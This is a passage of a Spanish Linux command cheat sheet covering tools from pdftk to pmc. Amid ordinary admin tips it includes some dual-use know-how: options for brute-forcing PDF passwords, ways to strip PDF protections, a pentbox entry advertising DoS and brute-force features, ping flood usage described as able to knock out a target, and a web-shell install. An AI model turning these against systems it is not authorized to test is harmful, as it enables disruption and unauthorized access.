$ pdftk texto.pdf output texto.128.pdf owner_pw foopass (Encriptar un PDF restringiendo todos los permisos)
$ pdftk mydoc.pdf output mydoc.128.pdf owner_pw foo user_pw baz (Lo mismo pero con contraseña para abrir el PDF)
$ pdftk mydoc.pdf output mydoc.128.pdf owner_pw foo user_pw baz allow printing (Lo mismo con permiso para imprimir una vez abierto)
$ pdftk secured.pdf input_pw foopass output unsecured.pdf (Desencriptar pdf)
$ pdftk A=secured.pdf mydoc.pdf input_pw A=foopass cat output combined.pdf (Unir dos PDFs uno de ellos encriptado. La salida no queda encriptada))
$ pdftk mydoc.pdf output mydoc.clear.pdf uncompress (Descomprimir cadenas de paginas PDF para editar el codigo PDF en un editor de texto)
$ pdftk broken.pdf output fixed.pdf (Reparar una tabla XREF de PDF y las longitudes de cadena, cuando es posible))
$ pdftk archivo.pdf output comprimido.pdf compress (Comprimir pdf)
$ pdftk archivo.pdf output descomprimido.pdf uncompress (Descomprimir pdf)
$ pdftk input.pdf cat 1-endE output output.pdf (rotar 90 grados el pdf)
$ pdftk archivo.pdf dump_data_fields (obtener campos de cualquier formulario pdf)
$ pdftk archivo.pdf dump_data_fields output campos.lst (Lo mismo derivado a un archivo)
$ pdftk archivo.pdf burst (Generar un pdf de cada página)
Opciones:
	-B: Realizar evaluación comparativa y salir
	-C [CADENA]: Utiliza los caracteres indicados para la busqueda de la contraseña
	-m [numero]: Se buscará hasta llegar a la longitud de caracteres de “numero”
	-n [numero]: Se empezará a probar contraseñas de “numero” caracteres
	-l [FILE]: Continuará desde el punto guardado en el archivo FILE.
	-q: Ejecutar silenciosamente
	-s: Realiza el crack permutando contraseñas
	-u: Trabajar con el “userpassword”


pdftocairo
Convierte spáginas de un pdf a cualquiera de los siguientes formatos de imagen: PNG, JPEG, TIFF, PDF, PS, EPS, SVG y Windows Printer
$ pdftocairo -f 1 -l 3 -r 200 -png archivo.pdf (creará 3 .png de la primera página [-f 1]  a la tercera [-l 3] a 200 de resolución [por defecto 150] del archivo.pdf)


pdftohtml
Pasar un pdf a html. Preferible lanzar en una carpeta sin contenido ya que, dependiendo de la medida del pdf, produce varios archivos.
$ pdftohtml -i -stdout archivo.pdf | w3m -T text/html (leerlo por consola con w3m sin mostrar imagenes [-i])
$ pdftohtml -s archivo.pdf (Crea un html de una sola página)
$ pdftohtml -c archivo.pdf (Crea una página cada una del pdf)


pdftops
Pasar un pdf a ps. Útil para imprimir archivos pdf protegidos contra escritura.
$ pdftops archivo.pdf  (El archivo.ps resultante puede ser impreso aunque el archivo.pdf estuviera protegido)


pdftotext
[xpdf-utils]. Maniupulación de pdfs.
$ pdftotext -listenc (Lista las codificaciones soportadas)
$ pdftotext -layout texto.pdf texto.txt
$ pdftotext -htmlmeta texto.pdf text.html
$ pdftotext -enc UTF-8 -htmlmeta texto.pdf texto.html (Especificando una codificación)


pdfunite
Unir varios pdf en un sólo documento.
$ pdfunite 1.pdf 2.pdf 1+2.pdf


pebrot
Cliente msn en ncurses. Ingresar usuario y contraseña en /home/USUARIO/.pebrot/pebrotrc
Algunos atajos:
	h (lista de comandos)
	l (contactos conectados y enumerados)
	numero  (abre conversación con el número del contacto)
	i numero (invita al usuario del numero indicado a la conversación)
	e (limpia la pantalla)
	c (cierra la conversación activa)
	a usuario (añade un usuario a contactos)
	b usuario (bloquea a usuario)
	f archivo (enviar archivo)
	fa (aceptar archivo que nos envian)
	fr (rechazar recepción de archivo)


pee
[moreutils]. Parecido al comando tee [ver] ejecutando cada uno de los comandos
$ pee ls pwd "ip a"


pentbox
Descarga de <http://www.pentbox.net/download-pentbox/> . Herramientas de penetración [verificar fortaleza de contraseñas cifradas en MD5, SHA1, SHA256, SHA512, generador de DoS i DDoS, generador de contraseñas seguras, honeypots, escaneo de puertos, ataque de fuerza bruta contra servidores HTTP, geolocalitzación de direcciones MAC...]
$ pentbox


perf-tools-unstable
Herramientas similares a DTrace de Solaris para análisis de rendimiento y que son experimentales o utilizan técnicas de trazado que podrían no ser estables en todas las versiones del kernel. Incluye las aplicaciones bitesize-perf, cachestat-perf, execsnoop-perf, funccount-perf, funcgraph-perf, funcslower-perf, functrace-perf, iolatency-perf, iosnoop-perf, killsnoop-perf, kprobe-perf, opensnoop-perf, perf-stat-hist-perf, reset-ftrace-perf, syscount-perf, tcpretrans-perf, tpoint-perf y uprobe-perf
# bitesize-perf (mostrará estadísticas sobre tamaño de operaciones de lectura y escritura en disco, número de operaciones y bytes transferidos, agrupados por tamaño. Parar con Ctrl-c)
# cachestat-perf -t 2 (muestra las estadísticas de aciertos y fallos de la caché de páginas del sistema cada 2 segundos. Por defecto 1)
# execsnoop-perf firefox (traza las llamadas a "exec" de procesos, mostrando los argumentos con los que se ejecutan relacionadas con "firefox")
# funccount-perf vfs_read (contar las llamadas a vfs_read [lecturas del sistema de archivos])
# iosnoop-perf (ver las operaciones de I/O a disco en tiempo real)


perftest
Es una colección de pruebas destinadas a usarse como microevaluación de rendimiento como medir la latencia y el ancho de banda de las estructuras Infiniband. Incluye varios ejecutables: ib_atomic_bw, ib_atomic_lat, ib_read_bw, ib_read_lat, ib_send_bw, ib_send_lat, ib_write_bw, ib_write_lat, raw_ethernet_burst_lat, raw_ethernet_bw, raw_ethernet_fs_rate, raw_ethernet_lat, run_perftest_loopback y run_perftest_multi_devices


periodic
Ejecutar un programa con un intervalo determinado. Descargar de https://github.com/josch/periodic
$ periodic -n 2 -c 3 -s -f echo "linux es genial" (cada 2 segundos, con 3 intervalos o sea imprimirá 4 veces el texto y sin imprimir el contador)
Otras opciones:
-d (contar hacia abajo, predeterminado hacia arriba)
-b BEGIN (iniciar el conteo en BEGIN, predeterminado 0)


pev
Herramienta para obtener información de los ejecutables PE32/PE32+ (EXE, DLL, OCX etc) como cabeceras, secciones, recursos y más.
$ pev -p putty..exe (ver solo la versión de putty.exe)
$ pev -dc cards.dll (mostrar los encabezados de archivo DOS y COFF de cards.dll)
$ pev svchost.exe (mostrar toda la información de svchost.exe)


peyote
Reproductor de música tipo moc. <http://peyote.sourceforge.net/>
$ peyote directory /home/USER/musica
algunas teclas de control:
	n (Siguiente canción)
	s (reproducir el directorio de forma aleatoria)
	r (Repetir)
	espacio (Pausa)
	q (Salvar la sesión y salir)
	tab (Moverse entre los paneles)


pg
Muestra un texto tabulado a pantalla completa de la terminal. Con la tecla intro carga nuevo párrafo.
$ pg archivo


pgrep
Examina los procesos en ejecución y enumera los identificadores de cada proceso.
$ pgrep emacs
$ pgrep httpd
$ pgrep -l -G group (del grupo especificado)
$ pgrep -l -u user (del usuario especificado)


pgtop
Monitorear la base de datos de postgres.
# pgtop -h localhost -s 10 -p 6543 -d BASE_DE_DATOS -u USER -p PASS (del host localhost, actualización cada 10 segundos [por defecto 5], puerto 6543 [por defecto 3306] de la base de datos especificada, usuario USER y la contraseña)


phockup
Organizar carpetas de fotos por año, mes y dia. Descarga: <https://github.com/ivandokov/phockup>
$ phockup -d YYYY/M  carpeta_fotos carpeta_ordenada (por año y mes por nombre en inglés)
$ phockup -l -d YYYY/MM  carpeta_fotos carpeta_ordenada (creando un link de las fotos en carpeta_ordenada hacia carpeta_fotos para no tenerlas duplicadas)
Formatos soportados:
    YYYY - 2017, 2018 ...
    YY   - 17, 18 ...
    MM   - 01, 02, ...
    M    - July, August, September ...
    m    - Jul, Aug, Sept ...
    DD   - 20, 21, ...


phoronix
[phoronix-test-suite]. suite de pruebas para medir el rendimiento de un sistema o componente del mismo [benchmarking]. Cuenta con un repositorio online con gran cantidad de pruebas y se ejecutan a través de un archivo de configuración XML.
# phoronix-test-suite list-available-tests (Lista los test disponibles y una pequeña descripción)
# phoronix-test-suite list-available-suites (Lista las suites disponibles y una pequeña descripción)
# phoronix-test-suite install pts/encode-flac (Instalar con sus dependencias un test o suite. En este caso el test pts/encode-flac)
# phoronix-test-suite benchmark pts/encode-flac (Realizar la prueba que mide el tiempo que el pc tarda en convertir un wav a flac)
# phoronix-test-suite system-information (Muestra la configuración completa)
# phoronix-test-suite list-saved-results (Ver los resultados guardados)
# phoronix-test-suite result-file-to-pdf archivo.pdf (Exportar resultados a un archivo pdf)
# phoronix-test-suite result-file-to-cvs archivo.cvs (Exportar los resultados a un archivo cvs)
# phoronix-test-suite result-file-to-text archivo.txt (Exportar los resultados a un archivo txt)
# phoronix-test-suite merge-results resultado1 resultado2 resultado3 (Realizar tablas comparativas con los resultados)
Nota.- Al realizar un test se nos preguntará si deseamos guardar la prueba (Los resultados se guardan e $HOME/.phoronix-test-suite/test-results), luego el test comenzará y una vez terminado se nos preguntará si queremos ver los resultados en el navegador.


photon
Generar una galería web.
$ photon directorio_con_las_imagenes  (Creará una nueva carpeta con todos los html)
$ photon -o /var/www/ /home/usuario/fotos (A partir de la carpeta fotos, lo creará en el directorio web)


photorec
[testdisk]. Recuperar datos de discos, tarjetas, cds deteriorados... Precisa pantalla maximizada.
# photorec


php
Lenguaje de programación diseñado originalmente para la creación de páginas web.
$ php -v (Conocer la versión)
$ php -m (Muestra módulos instalados)
$ php -i (Información general de php)
$ php -s archivo.php > archivo.html (Crea un archivo html de un php)
$ php -l script.php (Comprobar la sintaxis de un script.php)
$ php --ini (Informa donde se encuentran los archivos .ini de php)
$ php -S localhost:9000 -t /ruta/al/proyecto (Crear un servidor php ligero)
1.-
Configuración de php de forma segura (php.ini)
	# nano /etc/php/7.0/cli/php.ini
	expose_php Off (Ocultar la versión de php)
	session.use_trans_sid = Off (Que las URL no muestren los ID de sesiones)
	allow_url_fopen = Off (Desactivar acceso a URL remotas en funciones de manejo de ficheros)
	display_errors = Off (Evitar que los errores se muestren por pantalla)
Nota.- Para conocer la situación de php.ini, porque puede variar segun la versión de php y distro:
$ php -i | grep "Loaded Configuration File"
2.-
Arreglar el error: PHP Deprecated:  Comments starting with '#' are deprecated in /etc/php5/cli/conf.d/ming.ini on line 1 in Unknown on line 0
	# nano /etc/php5/cli/conf.d/ming.ini
	Y cambiar el “#” de los comentarios por un “;”


phpshell
[apache2 php5 libapache2-mod-auth-mysql php5-mysql]. Script en php que proporciona una terminal en el navegador. Descarga de http://sourceforge.net/projects/phpshell/?source=dlp. Para la versión 2.4:
$ wget http://sourceforge.net/projects/phpshell/files/phpshell/2.4/phpshell-2.4.zip
$ unzip phpshell-2.4.zip
Mover la carpeta al directorio web y darle un nombre:
$ mv phpshell-2.4/ /var/www/shell
Renombrar:
$ cd /var/www/shell
$ mv phpshell.php index.php
Entrar en el navegador y acceder en la dirección: http://localhost/shell/pwhash.php para entrar un nombre de usuario y una contraseña. Completado el registro, pulsar "update". Copiar el hash  que muestra y pegarlo en el archivo de configuración:
$ nano /var/www/shell/config.php
Pegar el hash en el apartado [users]
	templix = "sha1:2ud9a08b:27w6806b770f9716a9ec3f9b72a402e3b0a8b6e5"
Entrar en phpshell colocando en el navegador: http://localhost/shell


pi
Calcula la cantidad de decimales de pi que se le indique.
$ pi 100
$ pi 1000


pico
Editor de texto al estilo de Pine Composer.
$ pico fichero.txt
Algunas teclas para moverse por el fichero:
    ^p o <flecha arriba> ir a la linea anterior
    ^n o <flecha abajo>  ir a la linea siguiente
    ^a                   ir al principio de la línea.
    ^e                   ir al final de la línea.
    ^v                   adelanta una página
    ^y                   página anterior
    ^k                   elimina la línea del cursor.
    ^u                   restaura líneas eliminadas y las coloca en la posición del cursor.
    ^w                   busca texto
    ^x                   guardar y salir


picocom
Es un programa minimalista de emulación de terminal. Fue diseñado para servir como una herramienta sencilla y manual de configuración, prueba y depuración de módems. También funciona como un programa de comunicaciones serie de baja tecnología que permite el acceso a todo tipo de dispositivos que proporcionan consolas serie. Descarga de https://salsa.debian.org/debian/picocom. Salsa es un servidor de desarrollo colaborativo para Debian que proporciona las herramientas necesarias para el desarrollo colaborativo a los mantenedores de paquetes, equipos de empaquetado y otras personas y grupos relacionados con Debian.
# picocom /dev/ttyS0 (entra en la interrfaz del programa. C-a C-x para salir)
# picocom -b 115200 -f h /dev/ttyS0 (-b, velocidad en baudios y -f, control de flujo por hardware [RTS/CTS])
Otros controles de flujo pueden ser: "-f x" para el modo xon/xoff [software] y "-f n" para sin control de flujo, el predeterminado.


picom
Es un compositor en Xorg más avanzado que picon [ver] y con más opciones de personalización, soporte para efectos avanzados y mayor compatibilidad con entornos modernos y que también aplica efectos gráficos, sombras, transparencias, difumninados y animaciones.
$ picom & (se ejecuta con sus valores predeterminados y aplica efectos básicos como sombras y transparencias)
$ picom --active-opacity=1.0 --inactive-opacity=0.8 & (con las ventanas activas totalmente opacas y las inactivas serán un 80% opacas)
$ picom --shadow=true --shadow-radius=15 --shadow-opacity=0.75 & (activa las sombras, establece su radio y ajusta su opacidad)
$ picom --blur-method=dual_kawase --blur-strength=7 & (con método avanzado de difuminado y ajuste de su intensidad)
$ picom --shadow-exclude "class_g = 'Conky'" --opacity-rule "90:class_g = 'Firefox'" & (no aplica sombras a ventanas con la clase "Conky" y las de "Firefox" a un 90% de opacidad)
$ picom --log-level=debug --log-file=picom.log  (diagnosticar problemas y guarda un registro detallado en el archivo picom.log)
Crear un archivo de configuración detallado. Sirva de ejemplo:
$ nano  ~/.config/picom.conf
  # General
  backend = "glx";
  vsync = true;
  #
  # Sombras
  shadow = true;
  shadow-radius = 12;
  shadow-opacity = 0.8;
  #
  # Transparencias
  inactive-opacity = 0.85;
  active-opacity = 1.0;
  #
  # Difuminado
  blur-method = "dual_kawase";
  blur-strength = 5;
  #
  # Exclusiones
  shadow-exclude = [
      "class_g = 'Conky'",
      "_GTK_FRAME_EXTENTS@:c"
  ];
$ picom --config ~/.config/picom.conf & (iniciar la aplicación con este archivo)
$ picom --experimental-backends --no-fading-openclose --log-level=info (activa nuevas características experimentales, desactiva el desvanecimiento al abrir/cerrar ventanas y muestra más información para depuración)
Para habilitar o deshabilitar ciertos efectos mientras picom está en ejecución se usa señales de Unix:
$ pkill -USR1 picom (desactivar sombras)
$ pkill -USR2 picom (rehabilitar efectos)
$ pkill picom (detener la aplicación)


picon
compositor independiente para el sistema de ventanas Xorg, que gestiona y aplica efectos gráficos, como sombras y  transparencias a las ventanas y su entorno. Los compositores como picon son útiles para mejorar la apariencia visual y la experiencia del escritorio en sistemas basados en Xorg. La principal diferencia entre picon y picom [ver] radica en que picon es una implementación más minimalista y básica que picom, que es un compositor más avanzado.
$ picon & (iniciar el compositor. El símbolo & asegura que picon se ejecute en segundo plano y habilitará efectos básicos como sombras y transparencias según su configuración)
$ picon --inactive-opacity=0.85 --active-opacity=1.0 & (las ventanas inactivas serán un 85% opacas y las activas serán completamente opacas)
$ picon --shadow=true --shadow-radius=12 --shadow-opacity=0.7 & (activa las sombras, ajusta su tamaño y define su opcacidad)
$ picon --shadow-exclude "class_g = 'Notification'" & (excluye ventanas con la clase "Notification" útil para sistemas de notificaciones como Dunst)
Personalizar la aplicación utilizando el archivo de configuración. Un ejemplo podría ser:
$ nano ~/.config/picon/picon.conf
  # Transparencias
  inactive-opacity = 0.85;
  active-opacity = 1.0;
  #
  # Sombras
  shadow = true;
  shadow-radius = 10;
  shadow-opacity = 0.7;
  #
  # Exclusiones
  shadow-exclude = [
      "class_g = 'Notification'",
      "class_g = 'Conky'"
  ];
$ picon --config ~/.config/picon/picon.conf & (iniciar picon indicando este archivo de configuración)
$ picon --log-level=debug (ejecutarlo con un mayor nivel de detalle)


pidof
muestra el Pid del programa si está activo.


pidstat
[sysstat]. Muestra información relacionada con los procesos del sistema.
$ pidstat  (informa del uso de la CPU)
$ pidstat -u  (lo mismo)
$ pidstat -d  (Muestra la tasa de lectura/escritura a los medios fisicos)
$ pidstat -p 1234  (Especifica que solo deseas analizar el proceso 1234)
$ pidstat -C comando  (Similar a -p pero indicando el nombre del proceso)
$ pidstat -r  (Muestra el uso de memoria de los procesos y errores de 	paginación en la memoria de los procesos -page faults-).
$ pidstat -I  (En sistemas multicore, indica la CPU en la que se ejecuta el 	comando)
$ pidstat -d 5 2 (“5” es el intervalo de tiempo y “2” el número de veces que ejecutara el comando. Cuando haya llegado al número de 	ejecuciones, pidstat se parará y mostrará una media con los valores obtenidos)
$ pidstat -d 5  (omitiendo el numero de veces a ejecutar para producir un bucle infinito. Parar con ^C)


pig
[bsd-games]. Reformatear palabras o frases entradas en el prompt a un lenguaje macarrónico.
$ pig (entra en el prompt. Entrar cualquier frase pulsar enter y comprobar el resultado)


pigz
Compresión de ficheros. Permite lanzar varias instancias en paralelo para un único proceso de compresión. Sobrreescribe el fichero dándole extensión gz a menos que lo usemos con el parámetro -k. Pigz es casi lo mismo que gzip solo que aprovecha los múltiples cores a diferencia de gzip que solo usa un core. Al comprimir sólo ficheros, si queremos comprimir un directorio, primero se ha de empaquetar con tar (ver). Descarga y compilación:
	wget http://zlib.net/pigz/pigz-2.3.1.tar.gz
	$ tar -xzvf pigz-2.3.1.tar.gz
	$ make
Nota.- Si no se desea arrancar la aplicación con ./pigz crear un enlace directo en el path [ln -s pigz-2.3.1/pigz /usr/bin/]
$ pigz -p 4 fichero (Especificando número de procesos a levantar. Por defecto utiliza todos los cores i procesadores de la máquina)
$ pigz -k fichero (Sin sobreescrir el fichero)
$ pigz -d fichero.gz (Descomprimir el fichero creado)
$ pigz -r carpeta (Comprimir todos los archivos de la carpeta. No la carpeta)
Algunas opciones:
--fast (Nivel mínimo de compresión)
--best (Nivel máximo de compresión)


pilfile
Identificar archivos de imagenes.
$ pilfile -l (listado de archivos soportados)
$ pilfile -i grafic.png


pinentry-tty
Programa que permite la entrada segura de PIN o frases de contraseña.
# pinentry-tty (uso básico)
# gpg --passphrase-fd 0 | pinentry-tty (con gpg)
# ssh-keygen -t rsa -b 4096 -C "el_email@example.com" -f ~/.ssh/id_rsa (con ssh)


pinfo
Comando para mostrar información de los programas del proyecto GNU parecido a "info" [ver] pero más configurable.
$ pinfo ip
Ejemplo de archivo de configuración <http://pinfo.sourceforge.net/doc/pinfo.html#SEC8>
$ nano .pinforc
	# Here are some colour setting.
	# Whitespace between the entries is optional.
	#
	COL_NORMAL        =COLOR_WHITE,    COLOR_BLACK, NO_BOLD, NO_BLINK
	COL_MENUSELECTED  =COLOR_RED,      COLOR_BLACK, BOLD,    NO_BLINK
	COL_MENU          =COLOR_BLUE,     COLOR_BLACK, BOLD,    NO_BLINK
	COL_NOTESELECTED  =COLOR_RED,      COLOR_BLACK, BOLD,    NO_BLINK
	COL_NOTE          =COLOR_GREEN,    COLOR_BLACK, BOLD,    NO_BLINK
	COL_TOPLINE       =COLOR_YELLOW,   COLOR_BLUE,  BOLD,    NO_BLINK
	COL_BOTTOMLINE    =COLOR_YELLOW,   COLOR_BLUE,  BOLD,    NO_BLINK
	COL_MANUALBOLD    =COLOR_WHITE,    COLOR_BLACK, BOLD,    NO_BLINK
	COL_MANUALITALIC  =COLOR_WHITE,    COLOR_BLACK, BOLD,    NO_BLINK
	COL_URL           =COLOR_MAGENTA,  COLOR_BLACK, BOLD,    NO_BLINK
	COL_URLSELECTED   =COLOR_RED,      COLOR_BLACK, NO_BOLD, NO_BLINK
	COL_INFOHIGHLIGHT =COLOR_WHITE,    COLOR_BLACK, BOLD,    NO_BLINK
	#
	# Here are some keybindings as well...
	#
	KEY_TOTALSEARCH_1    ='s'
	KEY_TOTALSEARCH_2    ='S'
	KEY_SEARCH_1         ='/'
	KEY_SEARCH_2         ='.'
	KEY_GOTO_1           ='g'
	KEY_GOTO_2           ='m'
	KEY_HOME_1           ='h'
	KEY_HOME_2           ='H'
	KEY_PREVNODE_1       ='p'
	KEY_PREVNODE_2       ='P'
	KEY_NEXTNODE_1       ='n'
	KEY_NEXTNODE_2       ='N'
	KEY_UP_1             =KEY_UP
	KEY_UP_2             ='u'
	KEY_END_1            =KEY_END
	KEY_END_2            ='e'
	KEY_PGDN_1           =KEY_NPAGE
	KEY_PGDN_2           =' '
	KEY_PGDN_AUTO_1      =0
	KEY_PGDN_AUTO_2      =' '
	KEY_PGUP_1           =KEY_PPAGE
	KEY_PGUP_2           ='b'
	KEY_PGUP_AUTO_1      =0
	KEY_PGUP_AUTO_2      ='b'
	KEY_DOWN_1           =KEY_DOWN
	KEY_DOWN_2           ='d'
	KEY_TOP_1            =KEY_HOME
	KEY_TOP_2            ='t'
	KEY_BACK_1           =KEY_LEFT
	KEY_BACK_2           ='l'
	KEY_FOLLOWLINK_1     =KEY_RIGHT
	KEY_FOLLOWLINK_2     ='\n'
	# 12 is a code for ctrl+l
	KEY_REFRESH_1        =KEY_CTRL('l')
	KEY_REFRESH_2        ='~'
	KEY_SHELLFEED_1      ='!'
	KEY_SHELLFEED_2      ='1'
	KEY_QUIT_1           ='q'
	KEY_QUIT_2           ='Q'
	KEY_DIRPAGE_1        ='d'
	KEY_DIRPAGE_2        ='D'
	KEY_GOLINE_1         ='l'
	KEY_GOLINE_2         =0
	KEY_PRINT_1          =']'
	KEY_PRINT_2          =0
	KEY_SEARCH_AGAIN_1   ='f'
	KEY_SEARCH_AGAIN_2   =0
	#
	# Some options, explained in the man page
	#
	MANUAL=false
	CUT-MAN-HEADERS=true
	CUT-EMPTY-MAN-LINES=true
	RAW-FILENAME=false
	APROPOS=false
	DONT-HANDLE-WITHOUT-TAG-TABLE=false
	LONG-MANUAL-LINKS=false
	FILTER-0xB7=true
	QUIT-CONFIRMATION=false
	QUIT-CONFIRM-DEFAULT=no
	CLEAR-SCREEN-AT-EXIT=true
	STDERR-REDIRECTION="2> /dev/null"
	HTTPVIEWER=lynx
	FTPVIEWER=lynx
	MAILEDITOR=pine
	MANLINKS=1:8:2:3:4:5:6:7:9:n:p:o:3X11:3Xt
	INFOPATH=/usr/info:/usr/share/info:/usr/local/info
	HIGHLIGHTREGEXP=bash.*has
	SAFE-USER=nobody
	SAFE-GROUP=nobody


ping
Para saber si existe conexión con un host
$ ping ip (Uso básico)
$ ping -c 2 google.com (mandar solo dos paquetes)
$ ping -n google.com  (Muestra las direcciones ip por su número y no por su nombre de host)
$ ping -i 2 google.es (Establece un intérvalo de 2 segundos entre cada transmisión. Por defecto 1")
$ ping -w 3 google.es (Salir de ping a los 3 segundos)
# ping -f google.es (Envio masivo de pings. Por cada ECHO_REQUEST enviado se escribe un punto [.] y por cada ECO_REPLY recibido un baskspace [retroceso]. Puede colgar la red o la máquina objetivo mientras dura el ping)
# ping -s 200 google.es (Especificando número de bytes de datos que se envian. Por defecto 56. Combinado con el parámetro -f puede ser letal para la máquina objetivo)


pinky
Información sobre los usuarios del sistema.
$ pinky -l usuario
$ pinky -b usuario root (shells abiertas por los usuarios especificados)


pip
[python3-pip python-dev build-essential]. Herramienta para instalar, actualizar, eliminar y buscar paquetes de Python.
# pip install paquete
# pip uninstall paquete (desinstala el paquete)
# pip search paquete (Busca información sobre el paquete)
# pip freeze (Listar la totalidad de paquetes python instalados y su versión)
# pip list --outdated (listar paquetes abosoletos)
# pip show paquete (información de un paquete)
# pip check (verificar paquetes instalados si están bien instalados y no tienen problemas de dependencias)
# pip install --upgrade paquete (actualizar un paquete a su última versión)
# pip freeze | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip install -U (actualizar todos los paquetes)
# pip cache dir (Ver la ubicación del directorio que almacena copias en forma de cache de los paquetes que se descargan)


pipes
[pipes.sh]. Muestra tuberías que se dibujan en la terminal. Hay varios tipos de tuberías disponibles.
$ pipes -t 5 -p 10 (10 tuberias, por defecto 1 y con el modelo de caracteres 7)


pipx
[python3-venv]. Gestor de paquete python.
$ pipx ensurepath (añadir el directorio que usa la aplicación [~/.local/bin] al $PATH)
$ pipx install shell-genie (instalar un paquete)
$ pipx list (lista los paquetes instalados en /home/USER/.local/bin)
$ pipx list --short (solo listando paquetes y versión)
$ pipx list --json > pipx.json (crae un archivo de los paquetes instalados)
$ pipx install-all pipx.json (instalar los paquetes del listado anterior)
$ pipx environment (variables de entrono)
$ pipx completions (muestra lo que tiene que agregarse para autocompletado a .bashrc en el caso de bash y en otras shells)
$ pipx run cowsay check . (chequear como se comportaria un comando [cowsay] sin instalarlo)
$ pipx upgrade shell-genie (actualizar una aplicación)
$ pipx upgrade-all (actualizar todas las aplicaciones instaladas)
$ pipx uninstall shell-genie (desinstalar una aplicación)
$ pipx uninstall-all (desinstalar todas las aplicaciones instaladas)


pitidos
[del pc]. Señales de alerta sonora cuando algo falla.
Sin pitidos.-  Sin suministro eléctrico
Pitido constante ininterrumpido.-  Falla en el suministro eléctrico
Pitidos cortos y constantes.- Placa base defectuosa.
1 pitido corto .- Lo normal.
1 pitido largo.- Fallo en memoria RAM.
1 pitido largo + 1 corto.- Fallo general en la placa base
1 pitido largo + 2 cortos.- Problema con la tarjeta de vídeo
1 pitido largo + 3 cortos.- Monitor no conectado a la tarjeta gráfica
1 pitido largo + varios cortos.- Problema con la tarjeta de vídeo
2 pitidos largos + uno corto.- Error en la sincronización de imágenes


pkaction
[policykit o polkit según distros)]. Herramienta para manejar politicas que permitan a los procesos sin privilegios "hablar" con procesos privilegiados.
$ pkaction (Muestra todos los procesos a los que afecta esta politica)
# pkaction | grep power (Las que hacen referencia al proceso "power")


pkcon
[packagekit]. Gestión de paquetes para varios sistemas (apt-get, rpm...). Permite realizar tareas simples de administración de software, por ejemplo, actualizando la caché, instalando y eliminando paquetes de software o buscando codecs multimedia. Su interfaz gráfica, packagekit,  no pretende reemplazar herramientas avanzadas como Synaptic.
# pkcon update (equivalente al apt update)
# pkcon install paquete (instalar "paquete")
# pkcon remove paquete (eliminar "paquete")
# pkcon upgrade-system complete (actualizar toda la distro)
# pkcon get-updates (muestra los paquetes actualizables)
# pkcon get-packages (listar todos los paquetes disponibles e instalables)
# pkcon repo-list (listar todos los repos de lso paquetes instalados)
# pkcon repair (reparar la base de datos de los repositorios)


pkexec
Herramienta que forma parte de PolicyKit y permite que un usuario autorizado pueda ejecutar un único programa como si fuera otro usuario. Es el substituto de gksudo.
$ pkexec --user otro_usuario synaptic


pkill
matar procesos.
# pkill -x scribus (equivalente a: # killall scribus)
$ pkill -9 -t pts/3 (Mata procesos no basados en el PID. La terminal 3 en este caso)
# pkill -9 -t tty1 (Mata la terminal tty1)
# pkill -u `whoami` (Mata todos los procesos del usuario)
# pkill -KILL -u usuario (lo mismo)


pktstat
Monitor de tráfico de red
# pktstat -i eth0 -n -w 3 (especificando red, sin resolver las ips y refresco cada 3 segundos [por defecto cada 5])


planets
Simulador grabitacional del movimiento de los astros.
$ planets
Algunas teclas de control:
	j (Crea planetas orbitales aleatorios)
	r (Crea planetas aleatorios)
	c (Centra el sistema planetario)
	t (Muestra las trayectorias)
	e (Resetear el universo)
	s (Guardar)
	l (Cargar un universo)
	Flechas (Desplazan el conjunto)


play
[sox]. Reproductor
$ play archivo.wav


plocate
Encuentra todos los archivos del sistema que coinciden con el patrón dado o patrones dados. Incluye las herramientas plocate-build y updatedb.plocate
# updatedb.plocate (crear la base de datos)
$ plocate archivo.txt
$ plocate -c *.pdf (muestra la cantidad de coincidencias)
$ plocate -i archivo.pdf (sin distinción de mayúsculas y minúsculas)


plowshare
herramienta que permite subir y descargar archivos alojados en megaupload, rapidshare... ]http://plowshare.googlecode.com/files/plowshare-SVN-r1575-snapshot.tar.gz]
$ plowdown url (Descargar un archivo)
$ plowdown lista_de_links.txt (descarga una lista de links)
$ plowdown -a usuario:contraseña url (caso de precisar usuario y contraseña)


plymouth
Aplicación que se inicia muy temprano en el proceso de inicio y final y que proporciona una animación gráfica mientas el proceso de inicio o final ocurre en segundo plano lo que ayuda a proporcionar una experiencia visual fluida sin ver los mensajes de kernel y los parpadeos de la pantalla durante estos procesos.
# plymouth-set-default-theme --list (lista los temas de Plymouth disponibles instalados en el sistema)
# plymouth-set-default-theme -R moonlight (establece el tema y actualiza el initramfs, el sistema de archivos inicial, para incluir el nuevo tema)
# plymouth-set-default-theme --reset (restaura el tema de Plymouth a la opción por defecto de la distribución)
# update-initramfs -u (actualizar la configuración para que los cambios de Plymouth se apliquen en el siguiente arranque)
# update-grub (lo mismo)
# plymouthd (inicia el demonio de Plymouth en segundo plano)
# plymouth --show-splash (muestra la pantalla de bienvenida actualmente configurada. Solo funciona si el daemon está corriendo)
# plymouth --quit (detiene la previsualización del tema y el daemon de Plymouth)
# killall -9 plymouthd (lo mismo)
Para que Plymouth se ejecute, el gestor de arranque GRUB debe pasar parámetros específicos al kernel.
# nano /etc/default/grub
Y en la linea "GRUB_CMDLINE_LINUX_DEFAULT="quiet"" añadir la opción "splash" para que quede:
      GRUB_CMDLINE_LINUX_DEFAULT="quiet splash"
La opción `quiet` oculta los mensajes del kernel, y splash le dice al kernel que ejecute Plymouth.
# update-grub (para que los cambios se apliquen)


pm
[pm-utils]. Colección de comandos que permiten suspender, hibernar o pasar a modo de bajo consumo.
# pm-is-supported (determinar qué modos de ahorro de energía son soportado por el sistema)
# pm-powersave (activa o desactiva el modo de ahorro de energía, pasándolo a "L")
# pm-suspend (suspende las operaciones en memoria y coloca el sistema al mínimo consumo posible)
# pm-hibernate (hiberna el sistema bajando todos los datos de memoria al disco rígido)
# pm-suspend-hybrid (Híbrido entre hibernación y suspensión. En caso de agotarse la batería, se mantiene en estado de hibernación, sin perder datos)
Notas:
	H (High) máxima utilización del sistema de enfriamiento.
	A (Auto) sistema de regulación automática de temperatura.
	L (Low) mínimo uso del sistema de enfriamiento. Cuando supera cierto límite, pasa a modo automático.
1.-
opciones que permite un ordenador.
# cat /sys/power/state
Si en la salida aparece "mem" significa que podemos suspender el ordenador. Si aparece "disk" significa que podemos hibernar.


pmc
[Precision time protocol Management Client]. Herramienta utilizada para administrar y monitorear servidores PTP [Precision Time Protocol], especialmente en sistemas que requieren sincronización de tiempo de alta precisión según el estándar IEEE 1588.
